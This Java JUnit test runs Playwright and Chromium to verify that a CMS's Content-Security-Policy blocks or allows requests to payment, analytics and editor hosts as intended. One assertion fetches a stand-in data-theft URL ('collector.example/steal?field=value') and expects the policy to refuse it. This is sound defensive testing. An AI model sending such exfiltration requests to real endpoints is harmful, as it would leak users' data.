/*
 * Copyright 2026 SimIS Inc. (https://www.simiscms.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.simisinc.platform.presentation.controller;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mockStatic;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.mockito.MockedStatic;

import com.microsoft.playwright.Browser;
import com.microsoft.playwright.Page;
import com.microsoft.playwright.Playwright;
import com.microsoft.playwright.Route;
import com.simisinc.platform.application.admin.LoadSitePropertyCommand;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

/**
 * The enforced Content-Security-Policy, as PageServlet builds it, does in a real browser what it is
 * meant to (issue #1430).
 *
 * <p>The policy's own tests check its text, which cannot show what a browser does with it: whether a
 * path in a source matches, whether a wildcard reaches a second-level subdomain, which directive a
 * worker falls back to. This serves pages under {@link PageServlet#contentSecurityPolicy(String)}'s
 * output -- not a copy of it -- with site settings mocked, and watches Chromium enforce it. Requests
 * to other origins that the policy allows are answered by route interception, so nothing leaves the
 * machine; a request the policy refuses never gets that far, and fires securitypolicyviolation.
 *
 * @author SimIS Inc.
 */
class EnforcedCspBrowserTest {

  private static final Path WEBAPP = Path.of("src/main/webapp").toAbsolutePath().normalize();
  private static final String NONCE = "enforced-csp-browser-test";

  private static final Map<String, String> CONTENT_TYPES = Map.of(
      ".js", "application/javascript",
      ".css", "text/css",
      ".json", "application/json");

  /** Records every refusal, so a test can tell one apart from a request that failed for another reason. */
  private static final String RECORD_REFUSALS = """
      <script nonce="%s">
        window.cspViolations = [];
        document.addEventListener('securitypolicyviolation', function (e) {
          window.cspViolations.push(e.effectiveDirective + ' ' + e.blockedURI);
        });
      </script>
      """.formatted(NONCE);

  private static final String FETCH_PAGE = """
      <!DOCTYPE html>
      <html><head><meta charset="utf-8"><title>connect-src</title>%s</head><body></body></html>
      """.formatted(RECORD_REFUSALS);

  /** What css-editor.jsp loads, in its order, and how it starts the editor. */
  private static final String ACE_PAGE = """
      <!DOCTYPE html>
      <html><head><meta charset="utf-8"><title>Ace</title>%s
        <script src="/javascript/ace-1.32.0/ace.js"></script>
        <script nonce="%s" src="/javascript/ace-csp-nonce.js"></script>
        <script src="/javascript/ace-1.32.0/mode-css.js"></script>
        <style nonce="%s">#editor { width: 400px; height: 200px; }</style>
      </head><body>
        <div id="editor"></div>
        <script nonce="%s">
          var editor = ace.edit('editor');
          editor.getSession().setMode('ace/mode/css');
          // An empty rule is the worker's to flag; only the worker produces annotations
          editor.getSession().setValue('a {}\\n');
          window.editor = editor;
        </script>
      </body></html>
      """.formatted(RECORD_REFUSALS, NONCE, NONCE, NONCE);

  /** What the calendar JSPs load, and the month view they open on. */
  private static final String CALENDAR_PAGE = """
      <!DOCTYPE html>
      <html><head><meta charset="utf-8"><title>FullCalendar</title>%s
        <script src="/javascript/fullcalendar-6.1.10/index.global.min.js"></script>
      </head><body>
        <div id="calendar"></div>
        <script nonce="%s">
          new FullCalendar.Calendar(document.getElementById('calendar'), { initialView: 'dayGridMonth' }).render();
        </script>
      </body></html>
      """.formatted(RECORD_REFUSALS, NONCE);

  private static volatile String servedPolicy;
  private static volatile String servedPage;

  private static HttpServer server;
  private static String origin;
  private static Playwright playwright;
  private static Browser browser;
  private Page page;

  /** PageServlet's policy for a site with these settings, and nothing else set. */
  private static String policyFor(Map<String, String> settings) {
    try (MockedStatic<LoadSitePropertyCommand> properties = mockStatic(LoadSitePropertyCommand.class)) {
      properties.when(() -> LoadSitePropertyCommand.loadByName(anyString()))
          .thenAnswer(inv -> settings.get(inv.getArgument(0)));
      properties.when(() -> LoadSitePropertyCommand.loadByName(anyString(), anyString()))
          .thenAnswer(inv -> settings.getOrDefault(inv.getArgument(0), inv.getArgument(1)));
      return PageServlet.contentSecurityPolicy(NONCE);
    }
  }

  @BeforeAll
  static void startServerAndBrowser() throws IOException, InterruptedException {
    assertTrue(WEBAPP.resolve("javascript/ace-1.32.0/ace.js").toFile().isFile(),
        "vendored Ace not found (run from the project root)");
    server = HttpServer.create(new InetSocketAddress(InetAddress.getLoopbackAddress(), 0), 0);
    server.createContext("/", EnforcedCspBrowserTest::serve);
    server.start();
    origin = "http://127.0.0.1:" + server.getAddress().getPort();

    String nodePath = resolveSystemNodePath();
    System.setProperty("playwright.nodejs.path", nodePath);
    installChromiumIfMissing(nodePath);
    playwright = Playwright.create();
    browser = playwright.chromium().launch();
  }

  @AfterAll
  static void stopServerAndBrowser() {
    if (browser != null) {
      browser.close();
    }
    if (playwright != null) {
      playwright.close();
    }
    if (server != null) {
      server.stop(0);
    }
  }

  @AfterEach
  void closePage() {
    if (page != null) {
      page.close();
    }
  }

  private void open(String html, Map<String, String> settings) {
    servedPolicy = policyFor(settings);
    servedPage = html;
    page = browser.newPage();
    // Stands in for every other origin, so an allowed request succeeds without leaving the machine.
    // A request the policy refuses never gets here, which is what reachedNetwork records.
    page.route("https://**/*", route -> {
      String url = route.request().url();
      reachedNetwork.add(url);
      String path = URI.create(url).getPath();
      String type = path.endsWith(".js") ? "application/javascript"
          : path.endsWith(".css") ? "text/css"
          : path.endsWith(".html") ? "text/html"
          : path.endsWith(".woff2") ? "font/woff2"
          : "application/json";
      String body = type.equals("application/json") ? "{}" : type.equals("text/html") ? "<!DOCTYPE html><title>x</title>" : "";
      route.fulfill(new Route.FulfillOptions()
          .setStatus(200)
          .setHeaders(Map.of("Access-Control-Allow-Origin", "*", "Content-Type", type))
          .setBody(body));
    });
    page.navigate(origin + "/page.html");
  }

  private final List<String> reachedNetwork = Collections.synchronizedList(new ArrayList<>());

  /**
   * Has the page load each URL the way an SDK would -- a frame, a script without the nonce, a
   * stylesheet, a font -- and reports each as "allowed" when it reached the network or "refused" when
   * the policy stopped it.
   */
  private Map<String, String> loadFromPage(Map<String, String> urlsByKind) {
    page.evaluate("loads => { for (const [url, kind] of Object.entries(loads)) {"
        + " if (kind === 'frame') { const f = document.createElement('iframe'); f.src = url; document.body.appendChild(f); }"
        + " else if (kind === 'script') { const s = document.createElement('script'); s.src = url; document.head.appendChild(s); }"
        + " else if (kind === 'style') { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = url;"
        + "   document.head.appendChild(l); }"
        + " else if (kind === 'font') { new FontFace('probe' + Math.random(), 'url(' + url + ')').load().catch(() => {}); }"
        + " } }", urlsByKind);
    Map<String, String> directives = Map.of("frame", "frame-src", "script", "script-src-elem",
        "style", "style-src-elem", "font", "font-src");
    Map<String, String> outcomes = new LinkedHashMap<>();
    long deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(10);
    while (outcomes.size() < urlsByKind.size()) {
      List<String> violations = cspViolations();
      for (Map.Entry<String, String> load : urlsByKind.entrySet()) {
        URI target = URI.create(load.getKey());
        String refusal = directives.get(load.getValue()) + " " + target.getScheme() + "://" + target.getHost();
        if (reachedNetwork.contains(load.getKey())) {
          outcomes.put(load.getKey(), "allowed");
        } else if (violations.stream().anyMatch(v -> v.startsWith(refusal))) {
          outcomes.put(load.getKey(), "refused");
        }
      }
      assertTrue(System.nanoTime() < deadline, "neither loaded nor refused: " + urlsByKind + " " + outcomes);
      page.waitForTimeout(50);
    }
    return outcomes;
  }

  private static final Map<String, String> STRIPE_LOADS = Map.of(
      "https://js.stripe.com/v3/elements-inner-card.html", "frame",
      "https://b.js.stripe.com/v3/controller.html", "frame",
      "https://hooks.stripe.com/3d_secure_2/hosted.html", "frame",
      // Stripe.js inserts this without the nonce; the real SDK's request, renamed
      "https://js.stripe.com/v3/fingerprinted/js/trusted-types-checker.js", "script");

  private static final Map<String, String> SQUARE_SANDBOX_LOADS = Map.of(
      "https://sandbox.web.squarecdn.com/1.87.2/main-iframe.html", "frame",
      "https://sandbox.web.squarecdn.com/1.87.2/chunk.js", "script",
      "https://sandbox.web.squarecdn.com/1.87.2/square.css", "style",
      "https://square-fonts-production-f.squarecdn.com/square-sans.woff2", "font",
      "https://d1g145x70srn7h.cloudfront.net/fonts/square-sans.woff2", "font");

  @Test
  void withStripeOnTheCardFieldCanLoad() {
    open(FETCH_PAGE, Map.of("ecommerce.paymentProcessor", "Stripe"));
    loadFromPage(STRIPE_LOADS).forEach((url, outcome) -> assertEquals("allowed", outcome, url));
    assertEquals("allowed", fetchFromPage("https://api.stripe.com/v1/tokens"));
  }

  @Test
  void withSquareOnTheCardFieldCanLoad() {
    open(FETCH_PAGE, Map.of("ecommerce.paymentProcessor", "Square"));
    loadFromPage(SQUARE_SANDBOX_LOADS).forEach((url, outcome) -> assertEquals("allowed", outcome, url));
    assertEquals("allowed", fetchFromPage("https://pci-connect.squareupsandbox.com/payments/hydrate"));
  }

  @Test
  void withNoProcessorNoPaymentHostLoads() {
    open(FETCH_PAGE, Map.of());
    Map<String, String> all = new LinkedHashMap<>(STRIPE_LOADS);
    all.putAll(SQUARE_SANDBOX_LOADS);
    loadFromPage(all).forEach((url, outcome) -> assertEquals("refused", outcome, url));
  }

  /** "allowed" when the fetch completes, "refused" when connect-src stopped it. */
  private String fetchFromPage(String url) {
    int earlier = cspViolations().size();
    String outcome = (String) page.evaluate("async url => { try { await fetch(url); return 'allowed'; } "
        + "catch (e) { return 'refused'; } }", url);
    if ("refused".equals(outcome)) {
      // A failure for any other reason would make a "refused" pass for the wrong one, so it has to
      // come with a connect-src violation for this request's origin
      URI target = URI.create(url);
      String refusal = "connect-src " + target.getScheme() + "://" + target.getHost();
      waitUntil("window.cspViolations.slice(" + earlier + ").some(v => v.startsWith('" + refusal + "'))");
    }
    return outcome;
  }

  @Test
  void withNothingSwitchedOnScriptReachesThisSiteAndVimeosOembedEndpointOnly() {
    open(FETCH_PAGE, Map.of());

    assertEquals("allowed", fetchFromPage(origin + "/data.json"), "this site");
    assertEquals("allowed", fetchFromPage("https://vimeo.com/api/oembed.json?url=https%3A%2F%2Fvimeo.com%2F76979871"),
        "the call video.jsp makes for a Vimeo thumbnail");
    assertEquals("allowed", page.evaluate("async () => { const url = URL.createObjectURL(new Blob(['x'])); "
        + "try { await fetch(url); return 'allowed'; } catch (e) { return 'refused'; } }"),
        "TinyMCE reads a pasted image back from a blob: URL");

    assertEquals("refused", fetchFromPage("https://vimeo.com/user/settings"), "only the oEmbed path, not all of vimeo.com");
    assertEquals("refused", fetchFromPage("https://collector.example/steal?field=value"), "anywhere else");
    assertEquals("refused", fetchFromPage("https://region1.google-analytics.com/g/collect"),
        "Google's hosts are only for a site that loads Google Analytics");
  }

  @Test
  void withGoogleAnalyticsOnGtagReachesTheHostsItSendsTo() {
    open(FETCH_PAGE, Map.of("analytics.service", "google", "analytics.google.key", "G-TEST"));

    // Every host this site's own report-only data showed gtag.js calling
    for (String url : List.of(
        "https://region1.google-analytics.com/g/collect",
        "https://www.google-analytics.com/g/collect",
        "https://analytics.google.com/g/collect",
        "https://region1.analytics.google.com/g/collect",
        "https://stats.g.doubleclick.net/g/collect",
        "https://www.googletagmanager.com/td",
        "https://www.google.com/ccm/collect")) {
      assertEquals("allowed", fetchFromPage(url), url);
    }
    // Signals' advertising audience pings to Google's country domains stay refused, as in img-src
    assertEquals("refused", fetchFromPage("https://www.google.co.in/ads/ga-audiences"));
  }

  @Test
  void aceStartsItsSyntaxChecker() {
    open(ACE_PAGE, Map.of());

    // Annotations come only from the worker. Under a policy without worker-src, script-src refuses
    // the blob: worker, Ace logs "Could not load worker", and the editor never flags anything.
    long deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(20);
    while (((Number) page.evaluate("window.editor.getSession().getAnnotations().length")).intValue() == 0) {
      assertEquals(List.of(), cspViolations(), "refused while starting the editor");
      assertTrue(System.nanoTime() < deadline, "the syntax checker never reported: " + cspViolations());
      page.waitForTimeout(100);
    }
    assertEquals(List.of(), cspViolations());
  }

  @Test
  void calendarsGetTheirToolbarIcons() {
    open(CALENDAR_PAGE, Map.of());

    // The previous/next chevrons are glyphs in fcicons, which FullCalendar's injected CSS declares
    // as a data: URL. Refused, the font ends in "error" and the buttons render empty.
    String fcicons = "[...document.fonts].find(f => f.family.replace(/\"/g, '') === 'fcicons')";
    long deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(10);
    while (!"loaded".equals(page.evaluate("(" + fcicons + " || {}).status"))) {
      assertTrue(!"error".equals(page.evaluate("(" + fcicons + " || {}).status")),
          "the icon font was refused: " + cspViolations());
      assertTrue(System.nanoTime() < deadline, "the icon font never loaded: " + cspViolations());
      page.waitForTimeout(50);
    }
    assertEquals(List.of(), cspViolations());
  }

  @Test
  void whatNoDirectiveNamesFallsBackToThisSiteOnly() {
    open(FETCH_PAGE, Map.of());

    // media-src is not set, so default-src governs it
    page.evaluate("() => { const video = document.createElement('video'); "
        + "video.src = 'https://media.example/clip.mp4'; document.body.appendChild(video); }");
    waitUntil("window.cspViolations.length > 0");
    List<String> violations = cspViolations();
    assertEquals(1, violations.size(), violations.toString());
    assertTrue(violations.get(0).startsWith("media-src https://media.example"), violations.toString());
  }

  @SuppressWarnings("unchecked")
  private List<String> cspViolations() {
    return new ArrayList<>((List<String>) page.evaluate("window.cspViolations"));
  }

  /**
   * Waits for {@code expression} to be true in the page. Not waitForFunction: once its first check
   * comes back false it polls by compiling the expression inside the page, which script-src refuses
   * as eval. page.evaluate is compiled by DevTools, which the page's policy does not govern.
   */
  private void waitUntil(String expression) {
    long deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(10);
    while (!Boolean.TRUE.equals(page.evaluate(expression))) {
      assertTrue(System.nanoTime() < deadline, "timed out waiting for " + expression + ": " + cspViolations());
      page.waitForTimeout(50);
    }
  }

  private static void serve(HttpExchange exchange) throws IOException {
    try (exchange) {
      String path = exchange.getRequestURI().getPath();
      byte[] body;
      String contentType;
      if ("/page.html".equals(path)) {
        body = servedPage.getBytes(StandardCharsets.UTF_8);
        contentType = "text/html; charset=utf-8";
        exchange.getResponseHeaders().set("Content-Security-Policy", servedPolicy);
      } else if ("/data.json".equals(path)) {
        body = "{}".getBytes(StandardCharsets.UTF_8);
        contentType = "application/json";
      } else {
        Path file = WEBAPP.resolve(path.substring(1)).normalize();
        if (!file.startsWith(WEBAPP) || !Files.isRegularFile(file)) {
          exchange.sendResponseHeaders(404, -1);
          return;
        }
        body = Files.readAllBytes(file);
        String name = file.getFileName().toString();
        String extension = name.contains(".") ? name.substring(name.lastIndexOf('.')) : "";
        contentType = CONTENT_TYPES.getOrDefault(extension, "application/octet-stream");
      }
      exchange.getResponseHeaders().set("Content-Type", contentType);
      exchange.sendResponseHeaders(200, body.length);
      try (OutputStream out = exchange.getResponseBody()) {
        out.write(body);
      }
    }
  }

  /**
   * See TinyMceStrictCspTest -- Playwright's driver needs a system Node.js, duplicated here rather
   * than shared because that class keeps it private.
   */
  private static String resolveSystemNodePath() throws IOException, InterruptedException {
    String fromEnv = System.getenv("PLAYWRIGHT_NODEJS_PATH");
    if (fromEnv != null && !fromEnv.isBlank()) {
      return fromEnv;
    }
    Process which = new ProcessBuilder("which", "node").start();
    String output = new String(which.getInputStream().readAllBytes(), StandardCharsets.UTF_8).trim();
    if (which.waitFor() != 0 || output.isEmpty()) {
      throw new IllegalStateException(
          "No system Node.js found on PATH and PLAYWRIGHT_NODEJS_PATH is not set. "
              + "EnforcedCspBrowserTest needs a Node.js install to run Playwright's driver "
              + "(the vendored jar is the small driver artifact, not driver-bundle - see CONTRIBUTING.md). "
              + "Install Node.js or set PLAYWRIGHT_NODEJS_PATH to an existing install.");
    }
    return output;
  }

  /** Chromium is downloaded on first use rather than vendored; CLI.main calls System.exit, so it runs as a child. */
  private static void installChromiumIfMissing(String nodePath) throws IOException, InterruptedException {
    String javaBin = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
    Process process = new ProcessBuilder(javaBin, "-Dplaywright.nodejs.path=" + nodePath,
        "-cp", System.getProperty("java.class.path"),
        "com.microsoft.playwright.CLI", "install", "chromium")
        .inheritIO()
        .start();
    int exitCode = process.waitFor();
    if (exitCode != 0) {
      throw new IllegalStateException("Playwright chromium install failed with exit code " + exitCode);
    }
  }
}
